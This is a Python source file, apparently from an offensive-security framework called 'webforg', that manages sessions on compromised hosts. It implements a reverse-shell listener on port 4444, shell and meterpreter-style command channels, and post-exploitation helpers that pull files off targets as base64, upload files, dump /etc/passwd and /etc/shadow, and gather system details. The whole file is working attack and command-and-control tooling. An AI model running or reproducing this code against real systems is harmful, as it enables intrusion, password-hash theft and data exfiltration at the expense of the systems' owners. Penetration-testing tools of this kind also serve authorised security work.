"""Session management — tracks open shells/connections, listener service."""

from __future__ import annotations
import uuid
import time
import socket
import select
import struct
import shlex
import base64
import threading
import os
from dataclasses import dataclass, field
from typing import Optional
from webforg.core.target import Target


@dataclass
class Session:
    """Represents an active shell/meterpreter session on a compromised target."""

    id: str = field(default_factory=lambda: uuid.uuid4().hex[:8])
    target: Target = None
    module_name: str = ""
    payload_name: str = ""
    transport: object = None
    platform: str = ""
    hostname: str = ""
    username: str = ""
    cwd: str = ""
    created_at: float = field(default_factory=time.time)
    last_active: float = field(default_factory=time.time)
    alive: bool = True
    session_type: str = "shell"  # "shell" or "meterpreter"
    workspace: str = ""  # optional engagement/workspace tag (additive metadata)
    _read_buf: bytes = field(default=b"", repr=False)
    _echo_off: bool = field(default=False, repr=False)

    def send(self, command: str, timeout: float = 30.0) -> str:
        """Send command and return output."""
        self.last_active = time.time()
        if self.transport is None:
            return "[!] No transport connected"
        if not self.alive:
            return "[!] Session is dead"
        try:
            if hasattr(self.transport, 'send'):
                self.transport.sendall(f"{command}\n".encode())
                response = self._recv_until_prompt(timeout=3.0)
                return response
            return f"[!] Transport type {type(self.transport)} not supported"
        except Exception as e:
            self.alive = False
            return f"[!] Session error: {e}"

    def send_meterpreter(self, command: str) -> str:
        """Send a meterpreter-style command via TLV protocol."""
        if self.session_type != "meterpreter":
            return self.send(command)
        self.last_active = time.time()
        if self.transport is None or not self.alive:
            return "[!] No meterpreter session"
        try:
            # Simple meterpreter command: TLV type 0 (COMMAND), length-prefixed
            cmd_bytes = command.encode()
            pkt = struct.pack("<III", 0, 13 + len(cmd_bytes), 0) + cmd_bytes
            self.transport.sendall(pkt)
            response = b""
            while True:
                ready, _, _ = select.select([self.transport], [], [], 5.0)
                if ready:
                    hdr = self._recv_exact(12)
                    if not hdr:
                        break
                    tlv_type, tlv_len, _ = struct.unpack("<III", hdr)
                    if tlv_len > 12:
                        data = self._recv_exact(tlv_len - 12)
                        if tlv_type == 1001:  # RESULT
                            response += data
                    if tlv_type != 0:
                        break
                else:
                    break
            return response.decode(errors='replace') if response else "[*] No response"
        except Exception as e:
            self.alive = False
            return f"[!] Meterpreter error: {e}"

    def _recv_until_prompt(self, timeout: float = 3.0) -> str:
        """Read from socket until no more data within timeout."""
        response = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            ready, _, _ = select.select([self.transport], [], [], min(remaining, 0.5))
            if ready:
                try:
                    data = self.transport.recv(4096)
                    if not data:
                        self.alive = False
                        break
                    response += data
                    deadline = time.time() + 0.3
                except Exception:
                    break
            else:
                if response:
                    break
        return response.decode(errors='replace').strip()

    def _recv_exact(self, n: int) -> bytes:
        """Read exactly n bytes from transport."""
        buf = b""
        while len(buf) < n:
            ready, _, _ = select.select([self.transport], [], [], 5.0)
            if not ready:
                return buf
            chunk = self.transport.recv(n - len(buf))
            if not chunk:
                return buf
            buf += chunk
        return buf

    def probe_shell(self) -> str:
        """Send a harmless command to identify the shell type."""
        self.last_active = time.time()
        if not self.transport or not self.alive:
            return "unknown"
        try:
            self.transport.sendall(b"id\n")
            resp = self._recv_until_prompt(timeout=2.0)
            if "uid=" in resp:
                self.session_type = "shell"
                self.platform = "linux"
                return "linux_shell"
            self.transport.sendall(b"whoami\n")
            resp = self._recv_until_prompt(timeout=2.0)
            if resp:
                self.session_type = "shell"
                self.platform = "windows"
                return "windows_shell"
            self.transport.sendall(b"sysinfo\n")
            resp = self._recv_until_prompt(timeout=2.0)
            if "OS" in resp or "Computer" in resp:
                self.session_type = "meterpreter"
                return "meterpreter"
            return "unknown"
        except Exception:
            return "unknown"

    def close(self) -> None:
        """Terminate the session."""
        self.alive = False
        if self.transport:
            try:
                self.transport.close()
            except Exception:
                pass

    # ── Post-exploitation helpers (agent runs via plain shell + base64 framing) ──

    def _exec_framed(self, command: str, timeout: float = 8.0) -> str:
        """Send a command with stty echo disabled and a unique end-marker; return clean output."""
        tag = "WF" + uuid.uuid4().hex[:8]
        self.last_active = time.time()
        if not self.transport or not self.alive:
            return ""
        try:
            if not self._echo_off:
                self.transport.sendall(b"stty -echo 2>/dev/null\n")
                self._recv_until_prompt(timeout=1.0)
                self._echo_off = True
            self.transport.sendall(f"{command}; echo {tag}END\n".encode())
            resp = self._recv_until_prompt(timeout=timeout)
            endmark = f"{tag}END"
            if endmark in resp:
                resp = resp[: resp.index(endmark)]
            return resp.strip()
        except Exception:
            self.alive = False
            return ""

    def download(self, remote_path: str, timeout: float = 12.0) -> dict:
        """Download a file from the target as base64. Returns {'ok', 'name', 'size', 'data_b64'}."""
        name = remote_path.rsplit("/", 1)[-1] or "download"
        out = self._exec_framed(f"cat {shlex.quote(remote_path)} 2>/dev/null | base64 -w0", timeout=timeout)
        if not out:
            return {"ok": False, "name": name, "size": 0, "data_b64": "", "error": "No output (file may not exist)"}
        try:
            data = base64.b64decode(out)
        except Exception:
            return {"ok": False, "name": name, "size": 0, "data_b64": "", "error": "Could not decode output"}
        return {"ok": True, "name": name, "size": len(data), "data_b64": base64.b64encode(data).decode()}

    def upload(self, data: bytes, remote_path: str, timeout: float = 12.0) -> dict:
        """Upload raw bytes to a path on the target. Base64 alphabet is quote-safe."""
        b64 = base64.b64encode(data).decode()
        dst = shlex.quote(remote_path)
        if not b64:
            return {"ok": False, "error": "Empty data"}
        try:
            chunks = [b64[i:i + 3000] for i in range(0, len(b64), 3000)]
            for i, c in enumerate(chunks):
                mode = ">" if i == 0 else ">>"
                resp = self._exec_framed(f"printf '{c}' | base64 -d {mode} {dst}", timeout=timeout)
                if resp and "not found" in resp.lower():
                    return {"ok": False, "error": resp[:200]}
            ok = self.send(f"test -s {dst} && echo WF_OK || echo WF_MISSING")
            good = "WF_OK" in ok
            return {"ok": good, "path": remote_path, "size": len(data)}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def hashdump(self) -> dict:
        """Dump /etc/passwd and (if readable) /etc/shadow."""
        passwd = self._exec_framed("cat /etc/passwd 2>/dev/null")
        if not passwd:
            return {"ok": False, "passwd": "", "shadow": "", "error": "Could not read /etc/passwd"}
        shadow = self._exec_framed("cat /etc/shadow 2>/dev/null")
        return {"ok": True, "passwd": passwd, "shadow": shadow}

    def sysinfo(self) -> dict:
        """Gather basic system information."""
        uname = self._exec_framed("uname -a 2>/dev/null")
        osrel = self._exec_framed("cat /etc/os-release 2>/dev/null | head -3")
        idinfo = self._exec_framed("id 2>/dev/null")
        pwd = self._exec_framed("pwd 2>/dev/null")
        user = self._exec_framed("whoami 2>/dev/null")
        return {"ok": True, "uname": uname, "os": osrel, "id": idinfo, "pwd": pwd, "user": user}


class Listener:
    """TCP listener that accepts incoming reverse shell connections."""

    def __init__(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 4444,
        payload_type: str = "shell",
        name: str = "",
    ):
        self.lhost = lhost
        self.lport = lport
        self.payload_type = payload_type
        self.name = name or f"listener-{lport}"
        self._server_socket: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._lock = threading.Lock()
        self.on_session: Optional[callable] = None  # callback(new_session)

    @property
    def running(self) -> bool:
        return self._running

    def start(self, on_session: Optional[callable] = None) -> str:
        """Start the listener in a background thread."""
        with self._lock:
            if self._running:
                return f"[!] Listener already running on {self.lhost}:{self.lport}"
            try:
                self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self._server_socket.settimeout(1.0)
                self._server_socket.bind((self.lhost, self.lport))
                self._server_socket.listen(5)
                self._running = True
                self.on_session = on_session
                self._thread = threading.Thread(target=self._accept_loop, daemon=True)
                self._thread.start()
                return f"[+] Listener started on {self.lhost}:{self.lport}"
            except Exception as e:
                self._running = False
                return f"[-] Failed to start listener: {e}"

    def stop(self) -> str:
        """Stop the listener."""
        with self._lock:
            self._running = False
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass
            self._server_socket = None
        return f"[+] Listener {self.name} stopped"

    def _accept_loop(self):
        """Accept incoming connections."""
        while self._running:
            try:
                client_sock, addr = self._server_socket.accept()
                client_sock.settimeout(10.0)
                self._handle_connection(client_sock, addr)
            except socket.timeout:
                continue
            except OSError:
                break
            except Exception:
                continue

    def _handle_connection(self, sock: socket.socket, addr: tuple):
        """Handle an incoming connection and create a session."""
        target = Target(host=addr[0], port=addr[1])
        session = Session(
            target=target,
            module_name=self.name,
            payload_name=self.payload_type,
            transport=sock,
        )
        session.probe_shell()
        if self.on_session:
            self.on_session(session)
        return session


class SessionManager:
    """Manages all active sessions."""

    def __init__(self):
        self._sessions: dict[str, Session] = {}

    def create(
        self,
        target: Target,
        module_name: str,
        payload_name: str,
        transport=None,
        workspace: str = "",
    ) -> Session:
        session = Session(
            target=target,
            module_name=module_name,
            payload_name=payload_name,
            transport=transport,
            workspace=workspace,
        )
        self._sessions[session.id] = session
        return session

    def register(self, session: Session) -> str:
        """Register an externally created session."""
        self._sessions[session.id] = session
        return session.id

    def get(self, session_id: str) -> Optional[Session]:
        return self._sessions.get(session_id)

    def list(self) -> list[Session]:
        return list(self._sessions.values())

    def list_alive(self) -> list[Session]:
        return [s for s in self._sessions.values() if s.alive]

    def kill(self, session_id: str) -> bool:
        session = self._sessions.get(session_id)
        if session:
            session.close()
            del self._sessions[session_id]
            return True
        return False

    def kill_all(self) -> None:
        for s in list(self._sessions.values()):
            s.close()
        self._sessions.clear()


class ListenerManager:
    """Manages all active listeners."""

    def __init__(self):
        self._listeners: dict[str, Listener] = {}

    def create(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 4444,
        payload_type: str = "shell",
        name: str = "",
        **kwargs,
    ) -> Listener:
        from webforg.core.c2 import create_listener
        listener = create_listener(lhost, lport, payload_type, name, **kwargs)
        self._listeners[listener.name] = listener
        return listener

    def get(self, name: str) -> Optional[Listener]:
        return self._listeners.get(name)

    def list(self) -> list[Listener]:
        return list(self._listeners.values())

    def remove(self, name: str) -> bool:
        listener = self._listeners.get(name)
        if listener:
            listener.stop()
            del self._listeners[name]
            return True
        return False

    def stop_all(self) -> None:
        for listener in list(self._listeners.values()):
            listener.stop()
        self._listeners.clear()


# Global instances
sessions = SessionManager()
listeners = ListenerManager()
